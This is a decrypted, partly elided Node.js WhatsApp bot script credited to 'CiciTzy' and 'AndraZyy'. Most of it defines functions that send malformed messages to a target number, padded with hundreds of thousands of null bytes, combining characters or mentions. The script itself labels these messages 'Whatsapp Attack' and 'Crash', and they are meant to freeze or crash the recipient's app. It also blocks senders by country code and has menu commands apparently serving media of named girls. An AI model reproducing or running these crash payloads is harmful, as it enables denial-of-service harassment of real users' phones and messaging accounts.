/*DECRYPT BY CICITZY DEVELOPER, DI RENAME AWAS AJA LU*/

module.exports = async (AndraZyy, m, store) => {
  try {
    ...
    const v25 = await AndraZyy.decodeJid(AndraZyy.user.id);
    const v26 = m.key.fromMe ? AndraZyy.user.id.split(":")[0] + "@s.whatsapp.net" || AndraZyy.user.id : m.key.participant || m.key.remoteJid;
    const v27 = v26.split("@")[0];
    const v28 = m.pushName || "" + v27;
    const v29 = v25.includes(v27);
    const v30 = v24 ? await AndraZyy.groupMetadata(m.chat).catch(p8 => {}) : "";
    ...
    const v47 = fs.readFileSync("./lib/image/Cici Imut 1.jpg");
    const v48 = fs.readFileSync("./CiciTzy.jpg");
    const v49 = fs.readFileSync("./lib/image/Cici Imut 2.jpg");
    ...
    if (m.sender.startsWith("212")) {
      return AndraZyy.updateBlockStatus(m.sender, "block");
    }
    ...
    AndraZyy.sendButtonVideo = async (p12, p13, p14, p15 = {}) => {
      const v67 = {
      ...
      const v69 = {
        upload: AndraZyy.waUploadToServer
      };
      ...
      await AndraZyy.sendPresenceUpdate("composing", p12);
      return AndraZyy.relayMessage(p12, vGenerateWAMessageFromContent.message, {
    ...
    async function f(p16, p17, p18, p19, p20, p21, p22, p23) {
      ...
      await AndraZyy.relayMessage(p16, vGenerateWAMessageFromContent2.message, {
        participant: {
          jid: p16
        },
    ...
    async function f2(p24, p25, p26, p27, p28, p29, p30, p31, p32, p33, p34, p35, p36, p37) {
      ...
      await AndraZyy.relayMessage(p24, vGenerateWAMessageFromContent3.message, {
        participant: {
          jid: p24
        },
    ...
    async function f3(p38, p39) {
        ...
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "\0".repeat(990000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
      ...
      await AndraZyy.relayMessage(p38, vGenerateWAMessageFromContent4.message, {
        participant: {
          jid: p38
        },
    ...
    async function DocBug(target) {
      let virtex = "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐱 𝐂𝐢𝐜𝐢 𝐢𝐦𝐮𝐭";
        ...
        async function PayMent(LockJids) {
			...
			AndraZyy.relayMessage(LockJids, messageContent.message, {
...
    }, { participant: { jid: target } }, { messageId: null });
    ...
    async function f4(p40, p41) {
      ...
      await AndraZyy.relayMessage(p40, vGenerateWAMessageFromContent5.message, {
        participant: {
          jid: p40
        },
    ...
    async function f5(p42, p43) {
      ...
      await AndraZyy.relayMessage(p42, vGenerateWAMessageFromContent6.message, {
        participant: {
          jid: p42
        },
    ...
    async function f6(p44, p45, p46 = true) {
      ...
      await AndraZyy.relayMessage(p44, {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: v89,
    ...
    async function f7(p47, p48, p49, p50 = false, p51 = true) {
      ...
      await AndraZyy.relayMessage(p47, vGenerateWAMessageFromContent7.message, p51 ? {
        participant: {
          jid: p47
        }
      } : {});
      ...
      message: {
        interactiveResponseMessage: {
          ...
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@AndraZyy\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "".repeat(777777) + "\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            version: 3
          }
        }
      }
    ...
    async function f8(p52) {
      ...
      AndraZyy.relayMessage(p52, vGenerateWAMessageFromContent8.message, {
    ...
    async function f9(p53) {
        ...
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              ...
              newsletterName: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "\0".repeat(920000),
              jpegThumbnail: "",
      ...
      await AndraZyy.relayMessage(p53, vGenerateWAMessageFromContent9.message, {
        participant: {
          jid: p53
        },
    ...
    async function f10(p54, p55) {
      ...
      await AndraZyy.relayMessage(p54, vGenerateWAMessageFromContent10.message, {
        participant: {
          jid: p54
        },
    ...
    async function f11(p56, p57) {
      ...
      await AndraZyy.relayMessage(p56, vGenerateWAMessageFromContent11.message, {
        participant: {
          jid: p56
        },
    ...
    async function f12(p58) {
      await AndraZyy.relayMessage(p58, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
    ...
    async function f13(p59) {
      ...
      const v117 = {
        ...
        nativeFlowMessage: {
          buttons: [{
            ...
            name: "cta_url",
            buttonParamsJson: "{ display_text : '𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 𝐂𝐢𝐜𝐢 𝐂𝐚𝐧𝐭𝐢𝐤 🎀', url : '', merchant_url : '' }"
          }]
        }
      };
      const v118 = {
      ...
      await AndraZyy.relayMessage(p59, v120, {
        participant: {
          jid: p59
        }
      }, {
    ...
    async function f14(p60) {
      let v122 = "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "𑜦".repeat(40000);
      const v123 = {
        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
      ...
      await AndraZyy.relayMessage(p60, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v124,
    ...
    async function f15(p61) {
      ...
      await AndraZyy.relayMessage(p61, v141, {
        participant: {
          jid: p61
        }
      }, {
    ...
    async function f16(p62) {
      ...
      await AndraZyy.relayMessage(p62, {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: v145,
              ...
              nativeFlowMessage: {
                buttons: [{
                  ...
                  name: "single_select",
                  buttonParamsJson: "{\"title\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞  ◄" + "᬴".repeat(60000) + "\",\"sections\":[{\"title\":\"# ↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"rows\":[]}]}"
                }, {
                  name: "galaxy_message",
                  buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"flow_message_version\":\"9\",\"flow_token\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\"}"
                }, {
                  name: "mpm",
                  buttonParamsJson: "{}"
                }],
                messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\"↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\",\"body\":\"Zcoder Crash\"}"
              }
            }
          }
        }
    ...
    async function f17(p63) {
      let v151 = "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "ꦾ".repeat(50000);
      let v153 = Array.from({
        length: 35000
      ...
      v154.singleSelectReply.selectedRowId = "𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 𝐂𝐢𝐜𝐢 𝐂𝐚𝐧𝐭𝐢𝐤 🎀";
      ...
      let vV157 = v157;
      await AndraZyy.relayMessage(p63, vV157, {
        participant: {
          jid: p63
        }
      }, {
    ...
    async function f18(p64) {
      await AndraZyy.relayMessage(p64, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
              ...
              body: {
                text: "𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 𝐂𝐢𝐜𝐢 𝐂𝐚𝐧𝐭𝐢𝐤 🎀" + "ꦾ".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                ...
                groupMentions: [{
                  ...
                  groupSubject: "𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 𝐂𝐢𝐜𝐢 𝐂𝐚𝐧𝐭𝐢𝐤 🎀"
                }]
              }
            }
          }
    ...
    async function f19(p65, p66, p67 = false) {
      ...
      await AndraZyy.relayMessage(p65, vGenerateWAMessageFromContent12.message, p67 ? {
        participant: {
          jid: p65
        }
      } : {});
    ...
    async function f20(p68, p69, p70, p71 = false) {
      ...
      await AndraZyy.relayMessage(p68, vGenerateWAMessageFromContent13.message, p71 ? {
        participant: {
          jid: p68
        }
      } : {});
    ...
    async function f21(p72, p73, p74 = false, p75 = false) {
      ...
      await AndraZyy.relayMessage(p72, vGenerateWAMessageFromContent14.message, p75 ? {
        participant: {
          jid: p72
        }
      } : {});
    ...
    async function f22(p76, p77, p78 = false) {
      ...
      await AndraZyy.relayMessage(p76, vGenerateWAMessageFromContent15.message, p78 ? {
        participant: {
          jid: p76
        }
      } : {});
    ...
    async function f23(p79, p80 = false) {
      await AndraZyy.relayMessage(p79, {
        extendedTextMessage: {
          text: "𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 𝐂𝐢𝐜𝐢 𝐂𝐚𝐧𝐭𝐢𝐤 🎀\n" + "@6289999999999".repeat(150000),
          contextInfo: {
            ...
            externalAdReply: {
              title: "𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 𝐂𝐢𝐜𝐢 𝐂𝐚𝐧𝐭𝐢𝐤 🎀",
              body: "𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 𝐀𝐭𝐭𝐚𝐜𝐤 𝐁𝐲 𝐂𝐢𝐜𝐢 𝐂𝐚𝐧𝐭𝐢𝐤 🎀",
              mediaType: "VIDEO",
              renderLargerThumbnail: true,
              previewType: "VIDEO",
    ...
    async function f24(p81) {
      let v178 = "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞";
      await AndraZyy.relayMessage(p81, {
        groupMentionedMessage: {
          message: {
            interactiveMessage: {
              header: {
              ...
              body: {
                text: "↯ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞" + "@zcoder9".repeat(300000)
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: Array.from({
    ...
    for (let v184 of v43) {
      v183.push({
        displayName: await AndraZyy.getName(v184 + "@s.whatsapp.net"),
        vcard: "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await AndraZyy.getName(v184 + "@s.whatsapp.net")) + "\n\nFN:" + (await AndraZyy.getName(v184 + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + v184 + ":" + v184 + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: cici.tech@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://whatsapp.com/channel/0029VarnOfo1CYoPhQUMNa0D\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Indonesia;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    function f25(p82) {
      return "```" + p82 + "```";
    ...
    const vF5 = async (p85, p86, p87, p88, p89, p90, p91, p92, p93) => {
      ...
      AndraZyy.relayMessage(p85, vGenerateWAMessageFromContent16.message, {
        messageId: vGenerateWAMessageFromContent16.key.id
      });
    };
    const vF6 = p94 => {
      AndraZyy.sendMessage(m.chat, {
        text: p94,
        contextInfo: {
          mentionedJid: [v26],
          forwardingScore: 9999999,
          ...
          externalAdReply: {
            ...
            thumbnail: fs.readFileSync("./CiciTzy.jpg"),
            sourceUrl: "" + global.channel
          }
        }
      }, {
    ...
    const v192 = {
      ...
      message: {
        contactMessage: {
          ...
          jpegThumbnail: {
            url: "https://img101.pixhost.to/images/75/546420042_verlangidzopedia.jpg"
          }
        }
      }
    };
      ...
      case "cici-tzy":
        {
          vF6(`
❒ *[ 𝐂𝐢𝐜𝐢𝐓𝐳𝐲 💞 ]* ❒
𝐇𝐢💐 ${m.pushName} I am a *CiciTzy* bot designed to make you

💞 𝐍𝐚𝐦𝐞 𝐁𝐨𝐭 : 𝐂𝐢𝐜𝐢𝐓𝐳𝐲
💞 𝐔𝐬𝐞𝐫 𝐍𝐚𝐦𝐞 : ${m.pushName}
💞 𝐎𝐰𝐧𝐞𝐫 : 6289526156543
💞 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎.𝟎
...
_🎀This script was created by Cute Cici, and should not be misused by innocent people🎀_

ᥴᥙ𝗍ᥱ ᥴіᥴі ᥕі𝗍һ 𝗍rᥙᥱ 𝖿rіᥱᥒძs :
> AndraZyy
> CiciTzy cute`);
        }
        break;
      case "paptt":
        ...
        if (q == "foto") {
          ...
          AndraZyy.sendMessage(m.sender, v194, {
            quoted: m
          });
        } else if (q == "video") {
          ...
          AndraZyy.sendMessage(m.sender, v196, {
            quoted: m
          });
        }
        break;
      case "bocil":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v200, {
            quoted: m
          });
        } catch (_0x3aeb46) {
      ...
      case "gheayubi":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v204, {
            quoted: m
          });
        } catch (_0x2dc98f) {
      ...
      case "kayes":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v208, {
            quoted: m
          });
        } catch (_0xa440a8) {
      ...
      case "notnot":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v212, {
            quoted: m
          });
        } catch (_0x56b6b5) {
      ...
      case "panrika":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v216, {
            quoted: m
          });
        } catch (_0xbba8e9) {
      ...
      case "santuy":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v220, {
            quoted: m
          });
        } catch (_0x400666) {
      ...
      case "tiktokgabagtha":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v224, {
            quoted: m
          });
        } catch (_0x1832e1) {
      ...
      case "tiktokgirl":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v228, {
            quoted: m
          });
        } catch (_0x58e905) {
      ...
      case "ukhty":
        try {
          ...
          AndraZyy.sendMessage(m.sender, v232, {
            quoted: m
          });
        } catch (_0x1da20a) {
      ...
      case "kick":
        {
          ...
          await AndraZyy.groupParticipantsUpdate(m.chat, [v235], "remove").then(p99 => vF6(util.format(p99))).catch(p100 => vF6(util.format(p100)));
        }
        break;
      case "demote":
        {
          ...
          await AndraZyy.groupParticipantsUpdate(m.chat, [v236], "demote").then(p101 => vF6(util.format(p101))).catch(p102 => vF6(util.format(p102)));
        }
        break;
      case "promote":
        {
          ...
          await AndraZyy.groupParticipantsUpdate(m.chat, [v237], "add").then(p103 => vF6(util.format(p103))).catch(p104 => vF6(util.format(p104)));
        }
        break;
      case "sticker":
      case "stiker":
      case "s":
        {
          ...
          if (/image/.test(v22)) {
            ...
            let v240 = await AndraZyy.sendStimg(v14, v238, m, v239);
            ...
            let v243 = await AndraZyy.sendStvid(v14, v241, m, v242);
      ...
      case "addown":
        ...
        ciciown = q.split("|")[0].replace(/[^0-9]/g, "");
        let v249 = await AndraZyy.onWhatsApp(ciciown + "@s.whatsapp.net");
        if (v249.length == 0) {
        ...
        vF6(`
\`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞\` 
*𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘮𝘦𝘯𝘢𝘮𝘣𝘢𝘩𝘬𝘢𝘯 _${ciciown}_ *𝘬𝘦 𝘥𝘢𝘵𝘢𝘣𝘢𝘴𝘦 𝘰𝘸𝘯𝘦𝘳*`);
        break;
      case "delowner":
      case "delown":
        if (!v46) {
        ...
        v43.splice(unp, 1);
        fs.writeFileSync("./lib/database/owner.json", JSON.stringify(v43));
        vF6("`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞` \n*𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘮𝘦𝘯𝘨𝘩𝘢𝘱𝘶𝘴 _" + ciciown + "_ 𝘥𝘪 𝘥𝘢𝘵𝘢𝘣𝘢𝘴𝘦 𝘰𝘸𝘯𝘦𝘳*");
        break;
      case "addpremium":
      case "addprem":
        {
          ...
          ciciprem = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v250 = await AndraZyy.onWhatsApp(ciciprem);
          if (v250.length == 0) {
            return vF6(global.invalid);
          }
          v42.push(ciciprem);
          fs.writeFileSync("./lib/database/premium.json", JSON.stringify(v42));
          vF6("`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞` \n*successfully added premium _" + ciciprem + "_ to database 𝘱𝘳𝘦𝘮𝘪𝘶𝘮*");
        }
        break;
      case "delpremium":
      case "delprem":
        {
          ...
          if (!v21[0]) {
            return vF6("`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞` \n*example" + (v18 + v20) + " 6289526156543*");
          }
          ciciprem = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v42.indexOf(ya);
          v42.splice(unp, 1);
          fs.writeFileSync("./lib/database/premium.json", JSON.stringify(v42));
          vF6("`[ ↯ ] 𝐂𝐢𝐜𝐢𝐓𝐳𝐲💞` \n*successfully deleted premium _" + ciciprem + "_ in database 𝘱𝘳𝘦𝘮𝘪𝘶𝘮*");
        }
        break;
      case "self":
        {
    ...
    AndraZyy.sendMessage(global.owner + "@s.whatsapp.net", {
